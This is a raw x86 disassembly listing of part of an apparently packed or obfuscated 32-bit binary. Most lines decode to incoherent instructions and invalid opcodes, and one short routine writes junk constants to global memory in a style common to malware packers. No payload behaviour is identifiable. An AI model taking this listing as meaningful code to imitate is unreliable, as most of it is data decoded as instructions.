  40d201:	sbb    eax,0x8714a34a
  40d206:	or     DWORD PTR ss:[edi-0x50c2a676],ebp
  40d20d:	xchg   ecx,eax
  40d20e:	push   0xa3083155
  40d213:	popa   
  40d214:	xchg   ecx,eax
  40d215:	lods   eax,DWORD PTR ds:[esi]
  40d216:	mov    ebx,0x9b1a542e
  40d21b:	and    al,0xa
  40d21d:	xchg   DWORD PTR [ebp+ebp*8-0x2e68f903],esi
  40d224:	jae    0x40d20d
  40d226:	mov    dh,0xff
  40d228:	push   cs
  40d229:	dec    ebp
  40d22a:	and    DWORD PTR [ecx-0x6d],0x3ab68b5d
  40d231:	inc    ebx
  40d232:	retf   0xf54b
  40d235:	aad    0x8d
  40d237:	iret   
  40d238:	mov    ch,0xf6
  40d23a:	arpl   WORD PTR [edx],bp
  40d23c:	mov    dl,0xdb
  40d23e:	xchg   ebx,eax
  40d23f:	mov    esi,0xd6e5a2b9
  40d244:	popf   
  40d245:	out    dx,al
  40d246:	push   eax
  40d247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d248:	cs pushf 
  40d24a:	inc    esp
  40d24b:	repz repnz lds ebp,FWORD PTR [esi]
  40d24f:	inc    esp
  40d250:	inc    esi
  40d251:	jbe    0x40d2c8
  40d253:	int    0x45
  40d255:	xor    eax,edi
  40d257:	mov    esp,0xfd300878
  40d25c:	test   al,0x4c
  40d25e:	popa   
  40d25f:	sti    
  40d260:	mov    edi,0xc5e94cda
  40d265:	mov    dl,0xab
  40d267:	inc    ebx
  40d268:	jo     0x40d21b
  40d26a:	sub    edi,DWORD PTR [edx]
  40d26c:	shl    ah,1
  40d26e:	add    al,0x4c
  40d270:	inc    ebx
  40d271:	fwait
  40d272:	mov    edx,0x67ce4f00
  40d277:	jo     0x40d2ee
  40d279:	cmp    bl,bl
  40d27b:	(bad)  
  40d27c:	cmp    ch,ch
  40d27e:	xchg   ebp,eax
  40d27f:	dec    edi
  40d280:	mov    ah,0x12
  40d282:	mov    ds:0x91918088,eax
  40d287:	aas    
  40d288:	mov    bl,0x3f
  40d28a:	inc    ebx
  40d28b:	ins    DWORD PTR es:[edi],dx
  40d28c:	push   edx
  40d28d:	mov    edi,0x49a57e00
  40d292:	and    al,0xf9
  40d294:	pushf  
  40d295:	jg     0x40d22f
  40d297:	or     BYTE PTR [edx+0x31],dh
  40d29a:	scas   al,BYTE PTR es:[edi]
  40d29b:	ror    DWORD PTR [ebp-0x38a691d6],0xa2
  40d2a2:	adc    al,0x36
  40d2a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2a5:	dec    edx
  40d2a6:	retf   
  40d2a7:	mov    BYTE PTR [ebx-0x53],ah
  40d2aa:	xor    esp,DWORD PTR [ebp-0x62]
  40d2ad:	inc    ecx
  40d2ae:	or     eax,0x1d0dbbeb
  40d2b3:	enter  0xaf84,0x5c
  40d2b7:	and    al,0x2c
  40d2b9:	sub    DWORD PTR [esi-0x36],eax
  40d2bc:	xchg   edx,eax
  40d2bd:	jns    0x40d2bc
  40d2bf:	mov    dh,0x4f
  40d2c1:	addr16 mov dh,0x66
  40d2c4:	pop    eax
  40d2c5:	sbb    DWORD PTR [ebx],eax
  40d2c7:	scas   eax,DWORD PTR es:[edi]
  40d2c8:	mov    bh,0xb1
  40d2ca:	inc    ebp
  40d2cb:	sbb    esp,DWORD PTR gs:[esi+0x1e]
  40d2cf:	loopne 0x40d2d6
  40d2d1:	mov    ecx,0xec287f5a
  40d2d6:	push   esi
  40d2d7:	xchg   edi,eax
  40d2d8:	mov    al,0xa6
  40d2da:	add    al,0xc4
  40d2dc:	xor    DWORD PTR [ecx-0x1fca0f32],0xffffffa8
  40d2e3:	and    BYTE PTR [esi+0x72],0x20
  40d2e7:	cmp    al,0x91
  40d2e9:	add    edi,DWORD PTR [edi]
  40d2eb:	adc    dh,BYTE PTR [ebx]
  40d2ed:	rol    ebx,cl
  40d2ef:	adc    dl,cl
  40d2f1:	sti    
  40d2f2:	call   0x7cf5:0x6521a956
  40d2f9:	xor    al,0xfb
  40d2fb:	dec    ecx
  40d2fc:	fdivr  DWORD PTR ds:0x6030080b
  40d302:	add    al,dh
  40d304:	arpl   WORD PTR [eax+0x19d72b94],si
  40d30a:	cld    
  40d30b:	scas   eax,DWORD PTR es:[edi]
  40d30c:	mov    ah,0xa1
  40d30e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d30f:	ins    BYTE PTR es:[edi],dx
  40d310:	jno    0x40d38b
  40d312:	jecxz  0x40d304
  40d314:	ja     0x40d336
  40d316:	jo     0x40d337
  40d318:	xor    DWORD PTR [esi],ebx
  40d31a:	adc    al,0xe
  40d31c:	in     eax,0x80
  40d31e:	shl    DWORD PTR [esi-0x24ccaf6f],cl
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	bswap  ebp
  40d33a:	lds    edi,FWORD PTR [eax+0x7e7e97b0]
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	(bad)  
  40d345:	stos   BYTE PTR es:[edi],al
  40d346:	pusha  
  40d347:	add    BYTE PTR [ebp-0x5f],0x30
  40d34b:	mov    cl,0x53
  40d34d:	loopne 0x40d38e
  40d34f:	mov    ecx,0x65501a5b
  40d354:	rol    DWORD PTR [edx+0x62],1
  40d357:	jne    0x40d3c6
  40d359:	pop    ecx
  40d35a:	push   ecx
  40d35b:	(bad)  
  40d35c:	fist   WORD PTR [ebx+0x69]
  40d35f:	(bad)  
  40d360:	mov    bl,0xb2
  40d362:	sub    bh,dh
  40d364:	sbb    al,0xa4
  40d366:	popf   
  40d367:	stos   DWORD PTR es:[edi],eax
  40d368:	dec    esp
  40d369:	out    dx,al
  40d36a:	in     eax,dx
  40d36b:	or     eax,0x215d0770
  40d370:	int3   
  40d371:	xor    BYTE PTR [eax],dh
  40d373:	dec    ecx
  40d374:	pusha  
  40d375:	dec    esi
  40d376:	pop    esi
  40d377:	je     0x40d347
  40d379:	repnz inc esp
  40d37b:	clc    
  40d37c:	add    DWORD PTR [esi+0x41ce7117],esp
  40d382:	dec    esp
  40d383:	shr    BYTE PTR [ebx-0x39],1
  40d386:	lock fistp DWORD PTR [ebx-0x55]
  40d38a:	sar    BYTE PTR [esi],0x9c
  40d38d:	int    0xcc
  40d38f:	pop    ebp
  40d390:	adc    al,0x24
  40d392:	retf   0x850b
  40d395:	ret    0xe2fb
  40d398:	add    al,BYTE PTR [edx+0x1e]
  40d39b:	add    DWORD PTR [ecx+0x3ec503aa],0xffffffed
  40d3a2:	loope  0x40d350
  40d3a4:	stos   DWORD PTR es:[edi],eax
  40d3a5:	jmp    0xa2c43ffe
  40d3aa:	lds    edx,FWORD PTR [ebx-0x8]
  40d3ad:	pop    esi
  40d3ae:	jb     0x40d359
  40d3b0:	jecxz  0x40d430
  40d3b2:	js     0x40d406
  40d3b4:	add    dh,cl
  40d3b6:	mov    BYTE PTR [ebp+0x78dab72],bl
  40d3bc:	mov    bl,0x38
  40d3be:	push   edx
  40d3bf:	pop    ecx
  40d3c0:	and    DWORD PTR [esi],0xffffffd1
  40d3c3:	(bad)  
  40d3c4:	and    eax,0xd2e63a0b
  40d3c9:	inc    ebx
  40d3ca:	sbb    ecx,DWORD PTR [eax+0x38]
  40d3cd:	stos   DWORD PTR es:[edi],eax
  40d3ce:	ins    BYTE PTR es:[edi],dx
  40d3cf:	lods   al,BYTE PTR ds:[esi]
  40d3d0:	push   esi
  40d3d1:	inc    eax
  40d3d2:	xor    ebx,0xffffffa1
  40d3d5:	retf   0x6ddf
  40d3d8:	enter  0xa74c,0x1c
  40d3dc:	call   0xd5afefee
  40d3e1:	push   ds
  40d3e2:	dec    eax
  40d3e3:	xchg   ebp,eax
  40d3e4:	loop   0x40d42f
  40d3e6:	cmp    BYTE PTR [ebp-0x5e3dae8b],ch
  40d3ec:	mov    ecx,DWORD PTR ds:0xd21400c8
  40d3f2:	data16 cmp BYTE PTR [ebx+ebp*2+0x6a25c68d],0x4f
  40d3fb:	retf   0x27d0
  40d3fe:	(bad)  
  40d3ff:	xchg   edi,eax
  40d400:	and    bl,BYTE PTR [ebx]
  40d402:	sar    DWORD PTR [edx-0x42],1
  40d405:	pushf  
  40d406:	fcom   DWORD PTR [ebp+0x41]
  40d409:	(bad)  
  40d40a:	mov    eax,ds:0x5147a24
  40d40f:	out    0x31,eax
  40d411:	leave  
  40d412:	sub    al,dl
  40d414:	sub    BYTE PTR [esi+ebx*2+0x7bc5da83],0xca
  40d41c:	adc    esp,0x7d600315
  40d422:	(bad)  [eax]
  40d424:	icebp  
  40d425:	inc    esi
  40d426:	or     al,0x3b
  40d428:	dec    ebx
  40d429:	pop    edi
  40d42a:	shr    DWORD PTR [ebx+0x5],1
  40d42d:	xor    DWORD PTR [ebx+0x4c41afbe],0x60
  40d434:	loope  0x40d3ff
  40d436:	lahf   
  40d437:	adc    eax,0x7182bcba
  40d43c:	push   0xffffff91
  40d43e:	and    DWORD PTR [esi-0x7475b331],ecx
  40d444:	std    
  40d445:	pop    esp
  40d446:	fnstenv [edx-0x2b684690]
  40d44c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d44d:	mov    ch,0x62
  40d44f:	or     ebp,0x51f62733
  40d455:	inc    edx
  40d456:	or     esi,ebp
  40d458:	cmp    al,0x24
  40d45a:	ds enter 0x4f68,0x9a
  40d45f:	out    0x83,eax
  40d461:	and    edi,ebx
  40d463:	dec    edx
  40d464:	cmp    ch,BYTE PTR [ebx]
  40d466:	lods   al,BYTE PTR ds:[esi]
  40d467:	mov    eax,0x3cbf9985
  40d46c:	fisttp DWORD PTR ds:0x4f9692ab
  40d472:	sti    
  40d473:	jbe    0x40d408
  40d475:	mov    ds:0xa25ee436,eax
  40d47a:	adc    al,0x3f
  40d47c:	sbb    al,0x71
  40d47e:	mov    ebp,0x341df995
  40d483:	enter  0x9584,0xb2
  40d487:	(bad)  
  40d488:	jns    0x40d45d
  40d48a:	mov    dh,0xe6
  40d48c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d48d:	add    eax,DWORD PTR [ebx-0xed1985d]
  40d493:	int3   
  40d494:	xchg   ebp,eax
  40d495:	scas   al,BYTE PTR es:[edi]
  40d496:	or     ch,dl
  40d498:	push   0x20
  40d49a:	jle    0x40d4d1
  40d49c:	jne    0x40d470
  40d49e:	hlt    
  40d49f:	push   edi
  40d4a0:	mov    DWORD PTR [edx+edx*1+0xf015037],edi
  40d4a7:	int3   
  40d4a8:	fistp  WORD PTR [ebx]
  40d4aa:	cli    
  40d4ab:	das    
  40d4ac:	adc    BYTE PTR ds:0xa4d48ca,ch
  40d4b2:	sti    
  40d4b3:	mov    esp,0xb17034a6
  40d4b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4b9:	aad    0x41
  40d4bb:	jmp    0x9752:0x4a5700e2
  40d4c2:	push   esi
  40d4c3:	test   DWORD PTR [ecx-0x2c],esi
  40d4c6:	inc    esp
  40d4c7:	mov    ah,cl
  40d4c9:	and    eax,0x244bf447
  40d4ce:	(bad)
  40d4d2:	and    ebx,edi
  40d4d4:	add    DWORD PTR [edi],edx
  40d4d6:	loop   0x40d493
  40d4d8:	jne    0x40d54f
  40d4da:	stos   BYTE PTR es:[edi],al
  40d4db:	pop    es
  40d4dc:	call   0x59e08f9b
  40d4e1:	and    al,dl
  40d4e3:	aas    
  40d4e4:	repz scas eax,DWORD PTR es:[edi]
  40d4e6:	xor    eax,0x5772884f
  40d4eb:	fidivr DWORD PTR [eax-0x41]
  40d4ee:	lea    edi,[ebp*1+0x28fd791b]
  40d4f5:	or     DWORD PTR [eax+0x7fae3fac],edx
  40d4fb:	jae    0x40d4c4
  40d4fd:	adc    esi,DWORD PTR [ecx-0x2c]
  40d500:	push   0xffffffeb
  40d502:	pop    ds
  40d503:	(bad)
  40d506:	pusha  
  40d507:	lods   al,BYTE PTR ds:[esi]
  40d508:	mov    al,0x88
  40d50a:	jae    0x40d526
  40d50c:	xor    eax,0xdf833d25
  40d511:	mov    dl,0x8e
  40d513:	and    DWORD PTR [ebp-0x37],edi
  40d516:	and    BYTE PTR [edx+ebp*1+0x40],0x45
  40d51b:	mov    edx,0x78e7e9d2
  40d520:	dec    ebp
  40d521:	fwait
  40d522:	dec    edi
  40d523:	lods   al,BYTE PTR ds:[esi]
  40d524:	jno    0x40d4c1
  40d526:	dec    esp
  40d527:	fcomi  st,st(5)
  40d529:	int    0x41
  40d52b:	aaa    
  40d52c:	xor    al,0x48
  40d52e:	es into 
  40d530:	dec    eax
  40d531:	fadd   st(4),st
  40d533:	mov    ebx,0x3133a1cb
  40d538:	fst    QWORD PTR [ecx]
  40d53a:	pop    esp
  40d53b:	inc    eax
  40d53c:	or     BYTE PTR [eax-0x4a],al
  40d53f:	inc    ebx
  40d540:	or     DWORD PTR [eax-0x59bb57d5],ebp
  40d546:	mov    cl,0x55
  40d548:	into   
  40d549:	fstp   TBYTE PTR [eax]
  40d54b:	sbb    eax,0xa1ddd1b0
  40d550:	cwde   
  40d551:	test   DWORD PTR [edx+0x2651cfdb],ebp
  40d557:	jb     0x40d503
  40d559:	loope  0x40d520
  40d55b:	(bad)  
  40d55c:	dec    esi
  40d55d:	rcr    DWORD PTR [ebp-0x4bb3a70f],0xa4
  40d564:	fdiv   DWORD PTR [esi-0x1982d048]
  40d56a:	xlat   BYTE PTR ds:[ebx]
  40d56b:	nop
  40d56c:	and    eax,0xb2adfbd
  40d571:	shr    DWORD PTR [ebp+edx*8+0x5f4652f4],1
  40d578:	(bad)  
  40d579:	icebp  
  40d57a:	inc    edx
  40d57b:	cld    
  40d57c:	and    DWORD PTR [eax-0x46],eax
  40d57f:	leave  
  40d580:	loopne 0x40d594
  40d582:	bound  esi,QWORD PTR [edi-0x5]
  40d585:	adc    DWORD PTR [edx+0x430dd0d1],0x4b1a1c03
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x433823,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433817,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43381b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x433827,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x433863
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43381b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x4338a7,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x4338af,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x4337db,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x43385b,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433897,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433897
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433897,edx
  40d64f:	cmp    DWORD PTR ds:0x433897,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433897,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x4337e3,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x4337e3
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x4337e3,edx
  40d68b:	cmp    DWORD PTR ds:0x4337e3,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x4338d3
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x4337e3,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x4337e7
  40d6b7:	add    eax,DWORD PTR ds:0x43381b
  40d6bd:	mov    ds:0x4337e7,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x65a0482a
  40d6f9:	sub    al,0x2f
  40d6fb:	push   0x7a
  40d6fd:	xchg   edx,eax
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d732
  40d705:	repnz sahf 
  40d707:	sub    BYTE PTR [ebp+0x42],0x8c
  40d70b:	enter  0xec45,0xd0
  40d70f:	jae    0x40d6ad
  40d711:	int3   
  40d712:	aam    0x83
  40d714:	and    eax,0x8376492f
  40d719:	dec    edi
  40d71a:	mov    ch,0xb9
  40d71c:	adc    dl,BYTE PTR [eax-0x25bd779e]
  40d722:	mov    edx,0x3137f905
  40d727:	cmc    
  40d728:	(bad)  
  40d729:	mov    esp,0x876c55bf
  40d72e:	dec    esi
  40d72f:	cmp    bh,BYTE PTR [edx]
  40d731:	shr    BYTE PTR [esi],1
  40d733:	pop    esi
  40d734:	add    BYTE PTR ds:0xbf2716f1,dl
  40d73a:	nop
  40d73b:	out    0x4,eax
  40d73d:	add    eax,0xe547d4e3
  40d742:	cmp    eax,0x1ed4fe29
  40d747:	xchg   DWORD PTR [esp+ebx*2-0x27dc6310],edi
  40d74e:	mov    al,BYTE PTR [esi]
  40d750:	ins    DWORD PTR es:[edi],dx
  40d751:	jle    0x40d77e
  40d753:	mov    esp,0x970a606f
  40d758:	pop    ebx
  40d759:	lea    ebx,[edi-0x45]
  40d75c:	repz dec esi
  40d75e:	fsubr  DWORD PTR [ebx-0x55]
  40d761:	ret    
  40d762:	push   edi
  40d763:	loope  0x40d774
  40d765:	xor    BYTE PTR [eax],ah
  40d767:	imul   ecx,DWORD PTR ds:0x5c3e40fe,0xffffffbb
  40d76e:	lock cmp bl,BYTE PTR [ecx]
  40d771:	shr    DWORD PTR [edi-0x5c],1
  40d774:	stc    
  40d775:	arpl   WORD PTR [edi],ax
  40d777:	fld    QWORD PTR [esi]
  40d779:	scas   eax,DWORD PTR es:[edi]
  40d77a:	call   0x63d3:0x8a05d84e
  40d781:	mov    esp,ss
  40d783:	xchg   ebp,eax
  40d784:	push   ss
  40d785:	sbb    DWORD PTR [ecx],0xfffffff5
  40d788:	mov    eax,0xbad5eef8
  40d78d:	(bad)  
  40d78e:	lods   eax,DWORD PTR ds:[esi]
  40d78f:	mov    dh,0x77
  40d791:	adc    esp,DWORD PTR [ebx]
  40d793:	(bad)  
  40d794:	pop    ecx
  40d795:	fcmovne st,st(6)
  40d797:	push   es
  40d798:	pop    ecx
  40d799:	jecxz  0x40d7a8
  40d79b:	scas   eax,DWORD PTR es:[edi]
  40d79c:	das    
  40d79d:	xor    cl,BYTE PTR [eax]
  40d79f:	js     0x40d770
  40d7a1:	scas   eax,DWORD PTR es:[edi]
  40d7a2:	ror    BYTE PTR [eax],1
  40d7a4:	fsubr  QWORD PTR [ebx+0x6f0284d7]
  40d7aa:	sbb    al,0xf8
  40d7ac:	push   esi
  40d7ad:	sub    DWORD PTR [esp+ebp*1-0x51],esp
  40d7b1:	std    
  40d7b2:	mov    al,al
  40d7b4:	jle    0x40d7e9
  40d7b6:	stos   BYTE PTR es:[edi],al
  40d7b7:	pop    ecx
  40d7b8:	pop    eax
  40d7b9:	out    0xf5,al
  40d7bb:	inc    ebp
  40d7bc:	ss dec ecx
  40d7be:	sub    BYTE PTR [eax],al
  40d7c0:	mov    WORD PTR [eax],cs
  40d7c2:	push   cs
  40d7c3:	push   es
  40d7c4:	add    eax,0x8e649cca
  40d7c9:	dec    esp
  40d7ca:	adc    ebx,DWORD PTR [edx+ebx*8]
  40d7cd:	mov    edx,0xc7310e85
  40d7d2:	mul    DWORD PTR [edi+0x1de43ad5]
  40d7d8:	xchg   cx,ax
  40d7da:	rol    BYTE PTR [esi-0x75],0xb5
  40d7de:	rcl    BYTE PTR [ebx+ebx*1-0x5c],1
  40d7e2:	fld    DWORD PTR [esi+ebp*2]
  40d7e5:	inc    ebp
  40d7e6:	jmp    0xbe994b24
  40d7eb:	mov    BYTE PTR [esi+0x7f5c47d3],al
  40d7f1:	mov    bh,0xd4
  40d7f3:	mov    al,0x2a
  40d7f5:	fistp  QWORD PTR [ebx]
  40d7f7:	stc    
  40d7f8:	or     al,0x24
  40d7fa:	or     DWORD PTR [ecx],esp
  40d7fc:	sbb    eax,edi
  40d7fe:	mov    eax,DWORD PTR fs:[esi]
  40d801:	xchg   edi,eax
  40d802:	add    BYTE PTR [edi+0xa9fa4a],dl
  40d808:	cmp    BYTE PTR [edx-0x7455b6b6],0x5f
  40d80f:	stc    
  40d810:	dec    edx
  40d811:	icebp  
  40d812:	ss fcmovb st,st(0)
  40d815:	cmp    ebx,DWORD PTR [ecx-0x13]
  40d818:	test   al,0xee
  40d81a:	bt     DWORD PTR [edi],0x4e
  40d81e:	test   eax,0x11b43633
  40d823:	xor    edi,ebp
  40d825:	jp     0x40d81d
  40d827:	ret    
  40d828:	sbb    al,BYTE PTR [edx+0x46]
  40d82b:	inc    esi
  40d82c:	in     al,0xa2
  40d82e:	scas   eax,DWORD PTR es:[edi]
  40d82f:	lds    esp,FWORD PTR [esi+0x38c3cb3e]
  40d835:	pop    ss
  40d836:	or     BYTE PTR [esi+0x4d],dl
  40d839:	pop    esi
  40d83a:	add    dh,0xbe
  40d83d:	push   edx
  40d83e:	cmp    eax,0xa26500ea
  40d843:	sbb    DWORD PTR [ecx+esi*1+0x7cb3169d],0x565dfad5
  40d84e:	inc    ecx
  40d84f:	(bad)  
  40d850:	and    ch,BYTE PTR [edi+ebx*8+0x6e79e974]
  40d857:	lds    ebp,FWORD PTR [ebx-0x5ecce904]
  40d85d:	pop    ecx
  40d85e:	pop    ebx
  40d85f:	dec    ebp
  40d860:	imul   ebp,DWORD PTR [esi-0x5c29a907],0xf6d752b0
  40d86a:	jge    0x40d8cc
  40d86c:	jmp    0x18204a71
  40d871:	aad    0x61
  40d873:	rcl    DWORD PTR [edx],0xc5
  40d876:	cmc    
  40d877:	mov    esi,0xe345027b
  40d87c:	push   ss
  40d87d:	mov    ch,0xf4
  40d87f:	adc    eax,edi
  40d881:	fwait
  40d882:	mov    bl,0x23
  40d884:	or     ah,BYTE PTR [ecx]
  40d886:	ret    0xc3d3
  40d889:	cmp    ebx,ebx
  40d88b:	mov    BYTE PTR [esi-0x6b],dl
  40d88e:	sahf   
  40d88f:	adc    DWORD PTR [eax+0x5dcf8e44],0x39139fac
  40d899:	mov    ds:0x76b5d0db,eax
  40d89e:	pop    ecx
  40d89f:	and    BYTE PTR [ebp+0x47],bh
  40d8a2:	mov    dh,0x9d
  40d8a4:	mov    ecx,0x608b06a6
  40d8a9:	xor    ch,dl
  40d8ab:	out    dx,al
  40d8ac:	and    al,0x35
  40d8ae:	lods   eax,DWORD PTR ds:[esi]
  40d8af:	pop    ebx
  40d8b0:	or     ah,BYTE PTR [esi-0x22]
  40d8b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8b4:	shl    DWORD PTR [ecx],cl
  40d8b6:	push   es
  40d8b7:	and    DWORD PTR [ebp-0x4886d7e0],edi
  40d8bd:	cmp    BYTE PTR [esi+0x16],ah
  40d8c0:	call   0x2ac1b8b5
  40d8c5:	lahf   
  40d8c6:	loop   0x40d921
  40d8c8:	jmp    0x5f6f:0x6473ab06
  40d8cf:	stos   DWORD PTR es:[edi],eax
  40d8d0:	jg     0x40d8d0
  40d8d2:	pop    ebx
  40d8d3:	dec    esi
  40d8d4:	mov    bl,BYTE PTR [edi+edi*2]
  40d8d7:	(bad)  
  40d8d8:	clc    
  40d8d9:	mul    DWORD PTR [esi+eax*4+0x2d]
  40d8dd:	jl     0x40d933
  40d8df:	lds    ecx,FWORD PTR [edx+edi*4-0x2f29ef16]
  40d8e6:	mov    WORD PTR ds:0x94f5c88b,gs
  40d8ec:	test   al,dh
  40d8ee:	cmp    BYTE PTR [eax],dh
  40d8f0:	(bad)  
  40d8f1:	into   
  40d8f2:	push   esp
  40d8f3:	sub    eax,0x35876deb
  40d8f8:	aam    0x1d
  40d8fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8fb:	xor    eax,0x52e5ad6a
  40d900:	lea    esp,[eax+0x3db1cb35]
  40d906:	in     al,0xe4
  40d908:	in     al,dx
  40d909:	cmp    BYTE PTR ds:0xae5b4e96,al
  40d90f:	fild   DWORD PTR [edx-0x53]
  40d912:	inc    esp
  40d913:	cld    
  40d914:	fstp   TBYTE PTR [edi-0x70]
  40d917:	mov    ebp,0x7158214
  40d91c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d91d:	jne    0x40d8ad
  40d91f:	jno    0x40d8c6
  40d921:	jp     0x40d8ef
  40d923:	leave  
  40d924:	mov    BYTE PTR [ecx-0xde01208],bl
  40d92a:	test   DWORD PTR ds:0x2654082c,ebx
  40d930:	js     0x40d979
  40d932:	inc    ebx
  40d933:	sbb    al,0x31
  40d935:	aaa    
  40d936:	div    DWORD PTR [ebx+0xdbe4ae0]
  40d93c:	cld    
  40d93d:	adc    eax,0x17557bec
  40d942:	retw   
  40d944:	mov    DWORD PTR [ecx],eax
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x82b51ed
  40d96a:	inc    edi
  40d96b:	push   ebp
  40d96c:	mov    al,ds:0x7e7e903a
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d94a
  40d976:	sahf   
  40d977:	int    0xb
  40d979:	xchg   esi,ebp
  40d97b:	push   cs
  40d97c:	(bad)  
  40d97e:	hlt    
  40d97f:	clc    
  40d980:	pop    ss
  40d981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d982:	jns    0x40d99e
  40d984:	popa   
  40d985:	pop    ebx
  40d986:	adc    eax,0x4cdd2034
  40d98b:	scas   al,BYTE PTR es:[edi]
  40d98c:	mov    ebp,0x9ada8485
  40d991:	pop    edi
  40d992:	jmp    FWORD PTR [esi-0x52]
  40d995:	dec    esp
  40d996:	adc    BYTE PTR [eax],0x84
  40d999:	leave  
  40d99a:	stos   DWORD PTR es:[edi],eax
  40d99b:	cmp    dh,BYTE PTR [edx+0x64]
  40d99e:	mov    WORD PTR [esi-0x331fe4b8],?
  40d9a4:	mov    WORD PTR [ecx],?
  40d9a6:	push   0xd51f9048
  40d9ab:	std    
  40d9ac:	fidivr WORD PTR [ecx+esi*4+0xe]
  40d9b0:	push   ebp
  40d9b1:	jp     0x40d9ec
  40d9b3:	or     ebx,DWORD PTR fs:[edi+0x52]
  40d9b7:	imul   esp,DWORD PTR [ebp+0x371bee9f],0xd0f5d5ae
  40d9c1:	cs inc ecx
  40d9c3:	data16 jns 0x40da29
  40d9c6:	dec    edi
  40d9c7:	js     0x40d9b7
  40d9c9:	pop    ss
  40d9ca:	repnz push ebp
  40d9cc:	sbb    al,0x20
  40d9ce:	sbb    al,0x6
  40d9d0:	pop    es
  40d9d1:	mov    bh,0xbc
  40d9d3:	mov    bl,0xd2
  40d9d5:	adc    DWORD PTR [eax+edx*1],edx
  40d9d8:	cmp    eax,0x7988fc0a
  40d9dd:	cs cdq 
  40d9df:	cmp    ebp,DWORD PTR [ebx+0x6]
  40d9e2:	scas   al,BYTE PTR es:[edi]
  40d9e3:	mov    al,0x5e
  40d9e5:	jmp    0x66a1ed1a
  40d9ea:	sub    edi,ecx
  40d9ec:	sti    
  40d9ed:	jmp    0x2f1b3631
  40d9f2:	lods   eax,DWORD PTR ds:[esi]
  40d9f3:	fldcw  WORD PTR ds:0xdd8913e7
  40d9f9:	cmp    al,0x33
  40d9fb:	sub    cl,BYTE PTR [edi+0x7c]
  40d9fe:	inc    esp
  40d9ff:	icebp  
  40da00:	pop    esi
  40da01:	mov    ds:0x606412d5,al
  40da06:	adc    esp,DWORD PTR [edx-0x14]
  40da09:	in     eax,dx
